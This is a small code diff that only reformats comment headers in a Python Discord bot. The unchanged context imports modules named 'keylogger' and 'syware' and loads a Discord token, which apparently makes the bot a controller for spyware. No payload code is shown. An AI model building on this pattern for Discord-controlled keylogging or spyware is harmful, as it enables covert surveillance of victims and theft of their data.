@@ -1,4 +1,4 @@
-# Librerias #
+## Librerias ##
 
 import discord
 from discord.ext import commands
@@ -7,7 +7,7 @@ import dotenv
 import keylogger as key 
 import syware as video
 
-# Discord #
+## Discord ##
 env = dotenv.find_dotenv('Tokkens.env')
 dotenv.load_dotenv(env)
 TOKEN = os.getenv('DISCORD_TOKEN')
